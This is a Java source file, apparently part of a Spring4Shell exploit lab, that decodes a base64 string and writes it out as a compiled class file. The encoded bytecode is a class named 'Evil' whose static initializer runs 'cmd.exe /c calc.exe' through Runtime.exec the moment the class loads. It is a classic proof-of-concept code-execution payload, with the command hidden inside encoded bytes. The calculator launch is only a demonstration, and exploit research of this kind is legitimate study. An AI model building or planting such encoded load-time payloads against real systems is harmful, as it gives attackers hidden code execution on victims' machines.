import sun.misc.BASE64Decoder;
import java.io.FileOutputStream;
import java.io.IOException;

public class decode {

    public static void main(String args[]) {
        byte[] buffer = null;
        String base64Code = "yv66vgAAADQAKwoACAAcCgAdAB4IAB8KAB0AIAcAIQoABQAiBwAjBwAkAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAZMRXZpbDsBAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQAQTWV0aG9kUGFyYW1ldGVycwEACDxjbGluaXQ+AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHACEBAApTb3VyY2VGaWxlAQAJRXZpbC5qYXZhDAAJAAoHACUMACYAJwEAE2NtZC5leGUgL2MgY2FsYy5leGUMACgAKQEAE2phdmEvbGFuZy9FeGNlcHRpb24MACoACgEABEV2aWwBABBqYXZhL2xhbmcvT2JqZWN0AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAAvAAEAAQAAAAUqtwABsQAAAAIADAAAAAYAAQAAAAEADQAAAAwAAQAAAAUADgAPAAAACQAQABEAAgALAAAAKwAAAAEAAAABsQAAAAIADAAAAAYAAQAAAAoADQAAAAwAAQAAAAEAEgATAAAAFAAAAAUBABIAAAAIABUACgABAAsAAABhAAIAAQAAABK4AAISA7YABFenAAhLKrYABrEAAQAAAAkADAAFAAMADAAAABYABQAAAAQACQAHAAwABQANAAYAEQAIAA0AAAAMAAEADQAEABYAFwAAABgAAAAHAAJMBwAZBAABABoAAAACABs=";
        String targetPath = "D:\\Environment\\JAVA\\Project\\Spring4Shell\\target\\classes\\decode.class";
        try {
            buffer = new BASE64Decoder().decodeBuffer(base64Code);
            FileOutputStream out = new FileOutputStream(targetPath);
            out.write(buffer);
            out.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}